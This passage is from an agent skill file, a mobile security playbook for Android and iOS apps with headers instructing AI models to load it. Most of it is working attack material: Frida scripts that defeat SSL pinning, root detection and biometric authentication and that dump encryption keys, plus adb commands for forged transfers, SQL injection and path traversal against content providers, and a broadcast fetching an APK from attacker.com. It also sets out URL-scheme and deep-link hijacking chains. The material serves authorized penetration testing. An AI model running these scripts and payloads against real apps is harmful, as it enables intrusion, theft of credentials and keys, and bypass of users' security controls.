---
name: mobile-all
description: >-
  Mobile security complete playbook. Covers Android (Frida scripts/exported components/WebView RCE/backup extraction/root detection bypass), iOS (keychain extraction/URL scheme hijack/Universal Links/runtime manipulation/binary analysis), and SSL pinning bypass (Flutter libflutter.so hook/OkHttp4 Kotlin name mangling/React Native/Xamarin). Load when testing mobile applications.
---

# Mobile Security — Complete Playbook

## Internal Navigation
| Part | Content |
|---|---|
| 1 | Android Pentesting |
| 2 | Android Frida Scripts |
| 3 | iOS Pentesting |
| 4 | iOS Runtime Tricks |
| 5 | SSL Pinning Bypass |

---
# Part 1: Android Pentesting


# SKILL: Android Pentesting Tricks — Expert Attack Playbook

> **AI LOAD INSTRUCTION**: Expert Android application security testing techniques. Covers SSL pinning bypass (Frida/Objection/LSPosed), component exposure, WebView exploitation, intent redirection, root detection bypass, and Play Integrity evasion. Base models miss Frida hook specifics and multi-layer bypass chains.

## 0. RELATED ROUTING

Before going deep, consider loading:

- [mobile-ssl-pinning-bypass](../mobile-ssl-pinning-bypass/SKILL.md) for in-depth cross-platform SSL pinning bypass techniques and framework-specific hooks
- [ios-pentesting-tricks](../ios-pentesting-tricks/SKILL.md) when also testing the iOS version of the same app
- [api-sec](../api-sec/SKILL.md) for backend API security testing once traffic is intercepted

### Advanced Reference

Also load [FRIDA_SCRIPTS.md](./FRIDA_SCRIPTS.md) when you need:
- Ready-to-use Frida script templates for common Android testing tasks
- Detailed hook points for OkHttp, Retrofit, Volley, WebView
- Root detection bypass script collection


## 1. SSL PINNING BYPASS

### 1.1 Frida Universal Bypass

```bash
# Install Frida server on device
adb push frida-server-16.x.x-android-arm64 /data/local/tmp/
adb shell "chmod 755 /data/local/tmp/frida-server-16.x.x-android-arm64"
adb shell "/data/local/tmp/frida-server-16.x.x-android-arm64 &"

# Universal SSL pinning bypass
frida -U -l ssl_pinning_bypass.js -f com.target.app --no-pause
```

| Hook Point | Library/Class | Coverage |
|---|---|---|
| `X509TrustManager.checkServerTrusted` | Android SDK | All standard HTTPS |
| `OkHttpClient.Builder.sslSocketFactory` | OkHttp 3.x/4.x | Square OkHttp |
| `CertificatePinner.check` | OkHttp 3.x/4.x | OkHttp pinning |
| `HttpsURLConnection.setSSLSocketFactory` | Android SDK | Legacy HTTPS |
| `SSLContext.init` | Android SDK | Custom SSL contexts |
| `WebViewClient.onReceivedSslError` | WebView | WebView SSL errors |
| `TrustManagerFactory.getTrustManagers` | Android SDK | Factory-created TMs |

### 1.2 Objection (Quick Method)

```bash
objection -g com.target.app explore
# Inside Objection REPL:
android sslpinning disable
```

### 1.3 Network Security Config (Debug Builds)

If you can modify the APK or it's a debug build:

```xml
<!-- res/xml/network_security_config.xml -->
<network-security-config>
  <debug-overrides>
    <trust-anchors>
      <certificates src="user" />  <!-- Trust user-installed CAs -->
    </trust-anchors>
  </debug-overrides>
</network-security-config>
```

### 1.4 Magisk Module Approach

| Module | Method | Scope |
|---|---|---|
| LSPosed + TrustMeAlready | Hooks system-wide TrustManager | All apps |
| LSPosed + SSLUnpinning | Targeted SSL bypass | Per-app |
| MagiskTrustUserCerts | Moves user CA to system store | All apps trusting system CAs |
| ConscryptTrustUserCerts | Patches Conscrypt | Newer Android (7+) |

---

## 2. COMPONENT EXPOSURE

### 2.1 Exported Activities

```bash
# Find exported activities (AndroidManifest.xml or aapt)
aapt dump xmltree target.apk AndroidManifest.xml | grep -B 5 "exported.*true"

# Launch exported activity directly
adb shell am start -n com.target.app/.AdminActivity
adb shell am start -n com.target.app/.DeepLinkActivity \
  -d "target://callback?token=attacker_token"

# With extra data
adb shell am start -n com.target.app/.TransferActivity \
  --es "amount" "99999" --es "recipient" "attacker"
```

### 2.2 Content Providers

```bash
# Query exposed content providers
adb shell content query --uri content://com.target.app.provider/users

# SQL injection in content provider
adb shell content query --uri "content://com.target.app.provider/users" \
  --where "1=1) UNION SELECT sql,2,3 FROM sqlite_master--"

# Path traversal in file-providing content provider
adb shell content read --uri "content://com.target.app.fileprovider/../../../../etc/hosts"
```

| Provider Type | Attack Vector | Impact |
|---|---|---|
| Database-backed | SQL injection via `query()` projection/selection | Data leak, auth bypass |
| File-backed | Path traversal via URI | Read arbitrary files |
| Parcelable | Type confusion in custom Parcelable | Code execution |

### 2.3 Broadcast Receivers

```bash
# Send crafted broadcast
adb shell am broadcast -a com.target.app.ACTION_UPDATE \
  --es "url" "http://attacker.com/malicious.apk"

# Ordered broadcast interception (higher priority receiver intercepts first)
# Register receiver with higher priority than target to intercept/modify data
```

### 2.4 Exported Services

```bash
# Start/bind to exported service
adb shell am startservice -n com.target.app/.BackgroundService \
  --es "command" "exfiltrate"

# List running services
adb shell dumpsys activity services | grep com.target
```

---

## 3. WEBVIEW VULNERABILITIES

### 3.1 JavaScript Interface RCE (Pre-API 17)

```java
// Vulnerable code: addJavascriptInterface without @JavascriptInterface annotation
webView.addJavascriptInterface(new JSInterface(), "android");

// Pre-API 17: Reflection-based RCE via injected JavaScript
// Inject into WebView:
// android.getClass().forName('java.lang.Runtime')
//   .getMethod('getRuntime').invoke(null).exec('id')
```

### 3.2 Modern WebView Attacks

| Vulnerability | Condition | Exploit |
|---|---|---|
| `setJavaScriptEnabled(true)` + untrusted content | JS enabled + attacker controls loaded URL | XSS → bridge access |
| `setAllowFileAccessFromFileURLs(true)` | file:// can read other file:// | Load `file:///data/data/com.target/...` |
| `setAllowUniversalAccessFromFileURLs(true)` | file:// can access any origin | Exfiltrate via XHR to attacker |
| `loadUrl(user_controlled)` | User input in loadUrl | javascript: scheme or file:// |
| `shouldOverrideUrlLoading` bypass | Incomplete URL validation | Redirect to attacker-controlled page |
| `evaluateJavascript` with tainted data | User data in JS execution | XSS in WebView context |

### 3.3 Deep Link to WebView Chain

```
1. Attacker crafts deep link: target://webview?url=https://attacker.com/xss.html
2. App opens WebView with attacker URL
3. XSS in WebView calls JavaScript bridge: android.sensitiveMethod()
4. Bridge executes in app context with app's permissions
```

---

## 4. INTENT REDIRECTION

Exported activity receives an Intent and starts another (internal) activity using data from the received Intent.

```java
// Vulnerable pattern:
Intent received = getIntent();
Intent redirect = (Intent) received.getParcelableExtra("next_intent");
startActivity(redirect);
// Attacker controls "next_intent" → can start any internal activity
```

```bash
# Exploit: start non-exported internal activity via redirection
adb shell am start -n com.target.app/.ExportedActivity \
  --es "next_intent" "intent:#Intent;component=com.target.app/.InternalAdminActivity;end"
```

| Pattern | Indicator | Risk |
|---|---|---|
| `getParcelableExtra` → `startActivity` | Intent-in-Intent | Start non-exported activities |
| `getStringExtra("url")` → `startActivity(Intent.ACTION_VIEW)` | URL forwarding | Open arbitrary URLs |
| `getStringExtra("class")` → `Class.forName` → `startActivity` | Dynamic class loading | Start any activity by name |

---

## 5. ROOT DETECTION BYPASS

### 5.1 Common Root Detection Checks

| Check | What It Detects | Frida Bypass |
|---|---|---|
| `su` binary exists | `/system/xbin/su`, `/sbin/su` | Hook `File.exists()` → return false |
| Build tags contain "test-keys" | `Build.TAGS` | Hook `Build.TAGS` → return "release-keys" |
| Magisk Manager installed | Package name check | Hook `PackageManager.getPackageInfo` |
| Superuser.apk present | Su management app | Hook `File.exists()` |
| RootBeer library | Multi-check root detection | Hook all RootBeer check methods |
| SafetyNet/Play Integrity | Server-side attestation | Requires Magisk DenyList + module |
| Abnormal system properties | `ro.debuggable=1`, etc. | Hook `SystemProperties.get` |

### 5.2 Magisk DenyList (Previously MagiskHide)

```bash
# Enable DenyList in Magisk Manager
# Add target app to DenyList — Magisk hides itself from that app
# Covers: su binary, Magisk Manager package, mount points, props
```

---

## 6. PLAY INTEGRITY / SAFETYNET BYPASS

| Level | What It Checks | Bypass Difficulty |
|---|---|---|
| Basic Integrity | Not rooted, not emulator | Easy (Magisk + DenyList) |
| Device Integrity | Bootloader locked, verified boot | Hard (requires locked bootloader) |
| Strong Integrity | Hardware-backed attestation | Very hard (hardware TEE) |

Techniques:
- Magisk with Zygisk enabled + DenyList for target app
- Play Integrity Fix (PIF) Magisk module: spoofs device fingerprint
- Shamiko module: hides root from specific apps
- Custom ROM with locked bootloader (Pixel-specific tricks)

---

## 7. TAPJACKING (OVERLAY ATTACKS)

```xml
<!-- Malicious overlay activity -->
<activity android:name=".OverlayActivity"
    android:theme="@style/TransparentTheme"
    android:excludeFromRecents="true">
</activity>

<!-- Requires SYSTEM_ALERT_WINDOW permission (draw over other apps) -->
```

| Android Version | Protection | Bypass |
|---|---|---|
| Pre-6.0 | None | Full overlay |
| 6.0–11 | `filterTouchesWhenObscured` (opt-in) | Apps not using it are vulnerable |
| 12+ | Untrusted touches blocked for overlay windows | Partial overlays, timing-based |

---

## 8. BACKUP EXTRACTION

```bash
# Check if backup allowed
aapt dump xmltree target.apk AndroidManifest.xml | grep allowBackup
# android:allowBackup(0x01010280)=(type 0x12)0xffffffff → true (default!)

# Extract backup
adb backup -f backup.ab -apk com.target.app
# Convert to tar
dd if=backup.ab bs=24 skip=1 | openssl zlib -d > backup.tar
tar xf backup.tar

# Analyze extracted data
find com.target.app -name "*.db" -o -name "*.xml" -o -name "*.json"
# Check shared_prefs/ for tokens, credentials
# Check databases/ for SQLite DBs with sensitive data
```

---

## 9. ADDITIONAL TRICKS

### 9.1 Debuggable App Exploitation

```bash
# If android:debuggable="true" in manifest
adb shell run-as com.target.app
# Now running as the app's user — full data directory access
cat /data/data/com.target.app/shared_prefs/*.xml
```

### 9.2 Drozer (Component Testing Framework)

```bash
# List attack surface
dz> run app.package.attacksurface com.target.app
# Exported Activities: 3
# Exported Services: 1
# Exported Providers: 2

# Query provider
dz> run app.provider.query content://com.target.app.provider/users
# Scan for injection
dz> run scanner.provider.injection -a com.target.app
```

### 9.3 Clipboard Sniffing

```java
// Pre-Android 10: any app can read clipboard
ClipboardManager cm = (ClipboardManager) getSystemService(CLIPBOARD_SERVICE);
cm.addPrimaryClipChangedListener(() -> {
    ClipData data = cm.getPrimaryClip();
    // Exfiltrate copied passwords, tokens, etc.
});
```

---

## 10. ANDROID PENTESTING DECISION TREE

```
Testing Android application
│
├── Can intercept HTTPS traffic?
│   ├── No → SSL pinning in place
│   │   ├── Frida available? → universal SSL bypass script (§1.1)
│   │   ├── Rooted + Magisk? → LSPosed + TrustMeAlready (§1.4)
│   │   ├── Debug build? → Network Security Config (§1.3)
│   │   └── None above? → manual decompile + patch + repackage
│   └── Yes → proceed to traffic analysis
│
├── Exported components found?
│   ├── Exported Activities → test direct launch, deeplink abuse (§2.1)
│   ├── Content Providers → SQLi, path traversal (§2.2)
│   ├── Broadcast Receivers → crafted intent injection (§2.3)
│   └── Services → unauthorized service binding (§2.4)
│
├── WebView present?
│   ├── JavaScript enabled + JS interface? → bridge exploitation (§3.1)
│   ├── File access enabled? → file:// scheme abuse (§3.2)
│   └── Deep link → WebView? → URL injection chain (§3.3)
│
├── Intent handling found?
│   └── Intent-in-Intent pattern? → redirect to internal activity (§4)
│
├── Root detection blocking testing?
│   ├── Client-side checks only? → Frida hook bypass (§5.1)
│   ├── SafetyNet/Play Integrity? → Magisk DenyList + modules (§6)
│   └── Custom obfuscated checks? → reverse engineer + targeted hooks
│
├── Sensitive data storage?
│   ├── allowBackup=true? → ADB backup extraction (§8)
│   ├── Debuggable? → run-as for direct data access (§9.1)
│   └── SharedPreferences → check for plaintext tokens/credentials
│
└── UI-based attacks applicable?
    └── Overlay possible? → tapjacking (§7)
```


---
# Part 2: Android Frida Scripts


## 1. UNIVERSAL SSL PINNING BYPASS

```javascript
// frida_ssl_bypass.js — hooks multiple SSL validation points
Java.perform(function() {

    // Hook TrustManager
    var TrustManager = Java.registerClass({
        name: 'com.frida.TrustManager',
        implements: [Java.use('javax.net.ssl.X509TrustManager')],
        methods: {
            checkClientTrusted: function(chain, authType) {},
            checkServerTrusted: function(chain, authType) {},
            getAcceptedIssuers: function() { return []; }
        }
    });

    var SSLContext = Java.use('javax.net.ssl.SSLContext');
    SSLContext.init.overload(
        '[Ljavax.net.ssl.KeyManager;',
        '[Ljavax.net.ssl.TrustManager;',
        'java.security.SecureRandom'
    ).implementation = function(km, tm, sr) {
        this.init(km, [TrustManager.$new()], sr);
    };

    // Hook OkHttp3 CertificatePinner
    try {
        var CertPinner = Java.use('okhttp3.CertificatePinner');
        CertPinner.check.overload('java.lang.String', 'java.util.List')
            .implementation = function(hostname, peerCerts) {
            return; // skip pinning check
        };
    } catch(e) {}

    // Hook OkHttp3 CertificatePinner.check$okhttp
    try {
        var CertPinner = Java.use('okhttp3.CertificatePinner');
        CertPinner['check$okhttp'].implementation = function(hostname, fn) {
            return;
        };
    } catch(e) {}

    // Hook HttpsURLConnection
    try {
        var HttpsConn = Java.use('javax.net.ssl.HttpsURLConnection');
        HttpsConn.setSSLSocketFactory.implementation = function(factory) {
            return; // prevent custom factory
        };
        HttpsConn.setHostnameVerifier.implementation = function(verifier) {
            return; // prevent custom verifier
        };
    } catch(e) {}

    console.log('[+] SSL Pinning bypassed');
});
```


## 2. ROOT DETECTION BYPASS

```javascript
// frida_root_bypass.js — comprehensive root detection bypass
Java.perform(function() {

    // Hook File.exists for su binary checks
    var File = Java.use('java.io.File');
    var rootPaths = ['/system/xbin/su', '/sbin/su', '/system/bin/su',
        '/system/su', '/data/local/xbin/su', '/data/local/bin/su',
        '/su/bin/su', '/magisk/.core/bin/su'];

    File.exists.implementation = function() {
        var path = this.getAbsolutePath();
        for (var i = 0; i < rootPaths.length; i++) {
            if (path === rootPaths[i]) {
                console.log('[Root Bypass] File.exists blocked: ' + path);
                return false;
            }
        }
        return this.exists();
    };

    // Hook Build.TAGS
    var Build = Java.use('android.os.Build');
    Build.TAGS.value = 'release-keys';

    // Hook PackageManager for Magisk/SuperSU detection
    var PM = Java.use('android.app.ApplicationPackageManager');
    var rootPackages = ['com.topjohnwu.magisk', 'eu.chainfire.supersu',
        'com.koushikdutta.superuser', 'com.noshufou.android.su'];

    PM.getPackageInfo.overload('java.lang.String', 'int').implementation = function(name, flags) {
        for (var i = 0; i < rootPackages.length; i++) {
            if (name === rootPackages[i]) {
                console.log('[Root Bypass] PM.getPackageInfo blocked: ' + name);
                throw Java.use('android.content.pm.PackageManager$NameNotFoundException').$new(name);
            }
        }
        return this.getPackageInfo(name, flags);
    };

    // Hook Runtime.exec for "which su" checks
    var Runtime = Java.use('java.lang.Runtime');
    Runtime.exec.overload('java.lang.String').implementation = function(cmd) {
        if (cmd.indexOf('su') !== -1 || cmd.indexOf('which') !== -1) {
            console.log('[Root Bypass] Runtime.exec blocked: ' + cmd);
            throw Java.use('java.io.IOException').$new('Command not found');
        }
        return this.exec(cmd);
    };

    // Hook System.getProperty for ro.debuggable etc.
    var System = Java.use('java.lang.System');
    System.getProperty.overload('java.lang.String').implementation = function(key) {
        if (key === 'ro.debuggable') return '0';
        if (key === 'ro.secure') return '1';
        return this.getProperty(key);
    };

    console.log('[+] Root detection bypassed');
});
```

---

## 3. METHOD TRACER

```javascript
// frida_trace_methods.js — trace all methods of a class
Java.perform(function() {

    function traceClass(className) {
        var clazz = Java.use(className);
        var methods = clazz.class.getDeclaredMethods();

        methods.forEach(function(method) {
            var methodName = method.getName();
            var overloads = clazz[methodName].overloads;

            overloads.forEach(function(overload) {
                overload.implementation = function() {
                    var args = Array.prototype.slice.call(arguments);
                    console.log('[TRACE] ' + className + '.' + methodName +
                        '(' + args.map(function(a) { return String(a); }).join(', ') + ')');

                    var ret = this[methodName].apply(this, arguments);
                    console.log('[TRACE] ' + className + '.' + methodName +
                        ' => ' + String(ret));
                    return ret;
                };
            });
        });

        console.log('[+] Tracing ' + methods.length + ' methods in ' + className);
    }

    // Usage: trace target class
    traceClass('com.target.app.api.AuthService');
});
```

---

## 4. CRYPTO HOOK (KEY & PLAINTEXT EXTRACTION)

```javascript
// frida_crypto_hooks.js — capture encryption keys and plaintext
Java.perform(function() {

    // Hook Cipher.init to capture keys
    var Cipher = Java.use('javax.crypto.Cipher');
    Cipher.init.overload('int', 'java.security.Key').implementation = function(mode, key) {
        var algo = this.getAlgorithm();
        var keyBytes = key.getEncoded();
        console.log('[Crypto] Cipher.init: algo=' + algo +
            ' mode=' + (mode === 1 ? 'ENCRYPT' : 'DECRYPT') +
            ' key=' + bytesToHex(keyBytes));
        return this.init(mode, key);
    };

    // Hook Cipher.doFinal to capture plaintext/ciphertext
    Cipher.doFinal.overload('[B').implementation = function(data) {
        console.log('[Crypto] Cipher.doFinal input (' + data.length + ' bytes): ' +
            bytesToHex(data));
        var result = this.doFinal(data);
        console.log('[Crypto] Cipher.doFinal output (' + result.length + ' bytes): ' +
            bytesToHex(result));
        return result;
    };

    // Hook SecretKeySpec constructor
    var SecretKeySpec = Java.use('javax.crypto.spec.SecretKeySpec');
    SecretKeySpec.$init.overload('[B', 'java.lang.String').implementation = function(key, algo) {
        console.log('[Crypto] SecretKeySpec: algo=' + algo + ' key=' + bytesToHex(key));
        return this.$init(key, algo);
    };

    // Hook MessageDigest (hash operations)
    var MessageDigest = Java.use('java.security.MessageDigest');
    MessageDigest.digest.overload('[B').implementation = function(data) {
        var algo = this.getAlgorithm();
        console.log('[Crypto] ' + algo + '.digest input: ' + bytesToHex(data));
        var result = this.digest(data);
        console.log('[Crypto] ' + algo + '.digest output: ' + bytesToHex(result));
        return result;
    };

    function bytesToHex(bytes) {
        if (!bytes) return 'null';
        var hex = [];
        for (var i = 0; i < bytes.length; i++) {
            hex.push(('0' + (bytes[i] & 0xFF).toString(16)).slice(-2));
        }
        return hex.join('');
    }

    console.log('[+] Crypto hooks installed');
});
```

---

## 5. WEBVIEW DEBUGGING ENABLER

```javascript
// frida_webview_debug.js — enable WebView debugging for all WebViews
Java.perform(function() {

    // Enable WebView debugging globally
    var WebView = Java.use('android.webkit.WebView');
    WebView.setWebContentsDebuggingEnabled(true);

    // Hook loadUrl to log all URLs loaded
    WebView.loadUrl.overload('java.lang.String').implementation = function(url) {
        console.log('[WebView] loadUrl: ' + url);
        return this.loadUrl(url);
    };

    WebView.loadUrl.overload('java.lang.String', 'java.util.Map').implementation = function(url, headers) {
        console.log('[WebView] loadUrl: ' + url + ' headers: ' + headers);
        return this.loadUrl(url, headers);
    };

    // Hook evaluateJavascript
    WebView.evaluateJavascript.implementation = function(script, callback) {
        console.log('[WebView] evaluateJavascript: ' + script);
        return this.evaluateJavascript(script, callback);
    };

    // Hook addJavascriptInterface to log bridge objects
    WebView.addJavascriptInterface.implementation = function(obj, name) {
        console.log('[WebView] addJavascriptInterface: name=' + name +
            ' class=' + obj.getClass().getName());
        return this.addJavascriptInterface(obj, name);
    };

    console.log('[+] WebView debugging enabled');
});
```

---

## 6. SHARED PREFERENCES DUMPER

```javascript
// frida_dump_prefs.js — dump all SharedPreferences
Java.perform(function() {
    var ctx = Java.use('android.app.ActivityThread').currentApplication().getApplicationContext();
    var prefsDir = ctx.getFilesDir().getParent() + '/shared_prefs/';

    var File = Java.use('java.io.File');
    var dir = File.$new(prefsDir);
    var files = dir.listFiles();

    if (files) {
        for (var i = 0; i < files.length; i++) {
            var name = files[i].getName().replace('.xml', '');
            var prefs = ctx.getSharedPreferences(name, 0);
            var all = prefs.getAll();
            var entries = all.entrySet().iterator();

            console.log('\n[SharedPrefs] === ' + name + ' ===');
            while (entries.hasNext()) {
                var entry = entries.next();
                console.log('  ' + entry.getKey() + ' = ' + entry.getValue());
            }
        }
    }
});
```

---

## 7. INTENT SNIFFER

```javascript
// frida_intent_sniffer.js — log all intents sent/received
Java.perform(function() {

    var Activity = Java.use('android.app.Activity');
    Activity.startActivity.overload('android.content.Intent').implementation = function(intent) {
        console.log('[Intent] startActivity: ' + intent.toString());
        if (intent.getExtras()) {
            console.log('[Intent] extras: ' + intent.getExtras().toString());
        }
        return this.startActivity(intent);
    };

    Activity.startActivityForResult.overload('android.content.Intent', 'int')
        .implementation = function(intent, requestCode) {
        console.log('[Intent] startActivityForResult: ' + intent.toString() +
            ' requestCode=' + requestCode);
        return this.startActivityForResult(intent, requestCode);
    };

    var Context = Java.use('android.content.ContextWrapper');
    Context.sendBroadcast.overload('android.content.Intent').implementation = function(intent) {
        console.log('[Intent] sendBroadcast: ' + intent.toString());
        return this.sendBroadcast(intent);
    };

    console.log('[+] Intent sniffer installed');
});
```

---

## 8. BIOMETRIC BYPASS

```javascript
// frida_biometric_bypass.js — bypass fingerprint/face authentication
Java.perform(function() {

    // BiometricPrompt (API 28+)
    try {
        var BiometricCallback = Java.use('android.hardware.biometrics.BiometricPrompt$AuthenticationCallback');
        BiometricCallback.onAuthenticationSucceeded.implementation = function(result) {
            console.log('[Biometric] Forcing authentication success');
            this.onAuthenticationSucceeded(result);
        };
        BiometricCallback.onAuthenticationFailed.implementation = function() {
            console.log('[Biometric] Intercepting failure → forcing success');
            // Don't call original — suppress failure
        };
    } catch(e) {}

    // AndroidX BiometricPrompt
    try {
        var AxCallback = Java.use('androidx.biometric.BiometricPrompt$AuthenticationCallback');
        AxCallback.onAuthenticationFailed.implementation = function() {
            console.log('[Biometric] AndroidX failure suppressed');
        };
    } catch(e) {}

    // FingerprintManager (legacy, pre-API 28)
    try {
        var FPCallback = Java.use('android.hardware.fingerprint.FingerprintManager$AuthenticationCallback');
        FPCallback.onAuthenticationFailed.implementation = function() {
            console.log('[Biometric] Legacy FP failure suppressed');
        };
    } catch(e) {}

    console.log('[+] Biometric bypass hooks installed');
});
```

---

## 9. SCRIPT USAGE QUICK REFERENCE

| Script | Command | Use Case |
|---|---|---|
| SSL bypass | `frida -U -l frida_ssl_bypass.js -f com.target` | Intercept HTTPS traffic |
| Root bypass | `frida -U -l frida_root_bypass.js -f com.target` | Run on rooted device without detection |
| Method tracer | `frida -U -l frida_trace_methods.js -f com.target` | Understand app logic |
| Crypto hooks | `frida -U -l frida_crypto_hooks.js -f com.target` | Extract keys, see plaintext |
| WebView debug | `frida -U -l frida_webview_debug.js -f com.target` | Inspect WebView URLs and bridges |
| Prefs dumper | `frida -U -l frida_dump_prefs.js -f com.target` | Extract stored credentials/tokens |
| Intent sniffer | `frida -U -l frida_intent_sniffer.js -f com.target` | Monitor IPC |
| Biometric bypass | `frida -U -l frida_biometric_bypass.js -f com.target` | Skip fingerprint/face auth |

Common flags:
- `-f`: spawn app (fresh start)
- `-U`: USB-connected device
- `-F`: attach to frontmost app
- `--no-pause`: don't pause on spawn (auto-resume)
- `-H host:port`: remote Frida server


---
# Part 3: iOS Pentesting


# SKILL: iOS Pentesting Tricks — Expert Attack Playbook

> **AI LOAD INSTRUCTION**: Expert iOS application security testing techniques. Covers jailbreak vs non-jailbreak methodology, keychain extraction, URL scheme/Universal Links abuse, Frida/Objection runtime hooks, binary protection checks, and data storage analysis. Base models miss protection class nuances and AASA misconfiguration patterns.

## 0. RELATED ROUTING

Before going deep, consider loading:

- [mobile-ssl-pinning-bypass](../mobile-ssl-pinning-bypass/SKILL.md) for in-depth SSL pinning bypass (SecTrust hooks, SSL Kill Switch, framework-specific techniques)
- [android-pentesting-tricks](../android-pentesting-tricks/SKILL.md) when also testing the Android version of the same app
- [api-sec](../api-sec/SKILL.md) for backend API security testing once traffic is intercepted

### Advanced Reference

Also load [IOS_RUNTIME_TRICKS.md](./IOS_RUNTIME_TRICKS.md) when you need:
- Frida recipes for iOS-specific hooks (ObjC class enumeration, method swizzling)
- Objection command reference for iOS
- Runtime hooking patterns and bypass templates


## 1. JAILBREAK VS NON-JAILBREAK TESTING

| Capability | Jailbroken | Non-Jailbroken |
|---|---|---|
| SSL pinning bypass | Frida, SSL Kill Switch 2, Objection | Network debugging proxy, MITM profiles (limited) |
| Keychain access | keychain-dumper, Frida dump | Only via backup extraction (limited) |
| Filesystem inspection | Full access to app sandbox | Only via `ideviceinstaller` + backup |
| Runtime manipulation | Frida, Cycript, LLDB attach | Frida on sideloaded apps (re-signed) |
| Binary analysis | Class-dump, Hopper on-device | Decrypt IPA on Mac, analyze offline |
| Method hooking | Full Frida/Cycript capability | Limited (needs re-signed app + Frida gadget) |

### Non-Jailbreak Testing Setup

```bash
# Extract IPA from device
ideviceinstaller -l                    # List installed apps
ios-deploy --id <UDID> --download --bundle_id com.target.app

# Or use frida-ios-dump for decrypted IPA (jailbroken)
python dump.py com.target.app

# Sideload with Frida gadget (non-jailbreak runtime hooking)
# 1. Extract IPA, 2. Insert FridaGadget.dylib into Frameworks/
# 3. Re-sign with valid profile, 4. Install via ios-deploy
```

---

## 2. KEYCHAIN EXTRACTION

### 2.1 Keychain Protection Classes

| Protection Class | Availability | Use Case | Risk Level |
|---|---|---|---|
| `kSecAttrAccessibleWhenUnlocked` | Only when device unlocked | Passwords, tokens | Medium |
| `kSecAttrAccessibleAfterFirstUnlock` | After first unlock until reboot | Background tokens | High (persists across locks) |
| `kSecAttrAccessibleAlways` | Always (deprecated iOS 12+) | Legacy apps | Critical |
| `kSecAttrAccessibleWhenPasscodeSetThisDeviceOnly` | Passcode set + unlocked | High-value secrets | Low |

### 2.2 Extraction Methods

```bash
# Jailbroken: keychain-dumper
/path/to/keychain-dumper -a              # Dump all accessible items
/path/to/keychain-dumper -g password     # Generic passwords only
/path/to/keychain-dumper -i              # Internet passwords

# Frida / Objection
objection -g com.target.app explore
> ios keychain dump
> ios keychain dump --json                # JSON output for parsing

# Frida script for keychain enumeration
frida -U -f com.target.app -l keychain_dump.js
```

### 2.3 What to Look For

| Item Type | Keychain Class | Typical Content |
|---|---|---|
| `kSecClassGenericPassword` | `genp` | App tokens, API keys, user credentials |
| `kSecClassInternetPassword` | `inet` | HTTP auth credentials, OAuth tokens |
| `kSecClassCertificate` | `cert` | Client certificates |
| `kSecClassIdentity` | `idnt` | Cert + private key pair |
| `kSecClassKey` | `keys` | Encryption keys |

---

## 3. URL SCHEME HIJACKING

### 3.1 Custom URL Scheme Discovery

```bash
# From IPA/app bundle — check Info.plist
plutil -p /path/to/Payload/Target.app/Info.plist | grep -A 10 CFBundleURLTypes

# Example output:
# "CFBundleURLSchemes" => ["targetapp", "fb123456789"]
```

### 3.2 Hijacking Attack

```
Scenario: Target app registers "targetapp://" for OAuth callback

1. Attacker app also registers "targetapp://" URL scheme
2. User initiates OAuth login in target app
3. OAuth provider redirects to targetapp://callback?code=AUTH_CODE
4. iOS may open attacker's app instead (non-deterministic scheme resolution)
5. Attacker captures OAuth authorization code
```

| Attack Vector | Technique | Impact |
|---|---|---|
| OAuth callback interception | Register same scheme | Steal authorization codes |
| Deep link hijacking | Register same scheme | Phishing, data interception |
| Payment callback interception | Register payment scheme | Transaction manipulation |

### 3.3 URL Scheme vs Universal Links Security

| Feature | Custom URL Scheme | Universal Links |
|---|---|---|
| Registration | Any app can claim any scheme | Requires AASA file on domain |
| Uniqueness | Not guaranteed (multiple apps) | One app per domain path |
| Validation | None | Cryptographic (AASA signed) |
| Recommended for | Non-sensitive navigation | OAuth callbacks, sensitive actions |
| Hijackable | Yes (duplicate registration) | Only via AASA misconfiguration |

---

## 4. UNIVERSAL LINKS EXPLOITATION

### 4.1 AASA (Apple-App-Site-Association) Misconfiguration

```bash
# Fetch AASA file
curl -s "https://target.com/.well-known/apple-app-site-association" | jq .
curl -s "https://target.com/apple-app-site-association" | jq .

# Check for wildcard patterns (overly broad)
# Bad: "paths": ["*"]     ← captures ALL URLs
# Bad: "paths": ["/NOT *"] ← poorly written exclusion
```

| Misconfiguration | Risk | Exploitation |
|---|---|---|
| Wildcard paths (`*`) | App claims all URLs on domain | Redirect chain may break UL → fallback to URL scheme |
| Missing AASA file | Universal Links won't work | App falls back to less-secure URL scheme |
| AASA on wrong domain | Links not associated | Scheme hijacking possible |
| AASA not served as `application/json` | Parsing failure | Links won't associate |
| CDN caching stale AASA | Outdated associations | Inconsistent behavior |

### 4.2 Breaking Universal Links → URL Scheme Fallback

```
Technique: Force Universal Link to not open app, causing fallback to URL scheme

1. User long-presses link → "Open in Safari" (disables UL for that domain)
2. Redirect chain: domain A → domain B → target (UL breaks on redirect)
3. JavaScript redirect instead of 302 (UL only works on server-side redirects)
4. App not installed → URL scheme fallback → hijackable
```

---

## 5. RUNTIME MANIPULATION

### 5.1 Frida on iOS

```bash
# Connect to app on jailbroken device
frida -U -f com.target.app --no-pause

# Basic ObjC exploration
> ObjC.classes                                    # List all classes
> ObjC.classes.NSURLSession                       # Check if class exists
> ObjC.classes.AppDelegate.$methods               # List methods
> ObjC.classes.AppDelegate['- isLoggedIn'].implementation  # Read method

# Hook method and modify return value
Interceptor.attach(ObjC.classes.AuthManager['- isAuthenticated'].implementation, {
    onLeave: function(retval) {
        retval.replace(ptr(1));  // Force return TRUE
    }
});
```

### 5.2 Objection iOS Commands

```bash
objection -g com.target.app explore

# Keychain
> ios keychain dump

# Cookies
> ios cookies get

# Pasteboard
> ios pasteboard monitor

# Jailbreak detection bypass
> ios jailbreak disable

# SSL pinning bypass
> ios sslpinning disable

# Binary info
> ios info binary

# Hooking
> ios hooking watch class AppDelegate
> ios hooking watch method "-[AuthManager isAuthenticated]" --dump-args --dump-return
> ios hooking set return_value "-[AuthManager isJailbroken]" false
```

### 5.3 Cycript (Legacy but Useful)

```javascript
// Attach to running app
cycript -p com.target.app

// Explore UI hierarchy
UIApp.keyWindow.recursiveDescription().toString()

// Find view controllers
[UIWindow.keyWindow().rootViewController _printHierarchy].toString()

// Call methods directly
[AppDelegate.sharedInstance isLoggedIn]  // → check return
AppDelegate.sharedInstance.isLoggedIn = true  // → modify

// Access singleton instances
var vc = choose(LoginViewController)[0]
vc.bypassLogin()
```

---

## 6. BINARY PROTECTIONS

### 6.1 Checking Binary Security

```bash
# PIE (Position Independent Executable)
otool -hv /path/to/binary | grep PIE

# ARC (Automatic Reference Counting)
otool -I -v /path/to/binary | grep objc_release

# Stack canaries
otool -I -v /path/to/binary | grep __stack_chk_guard

# Encryption (FairPlay DRM)
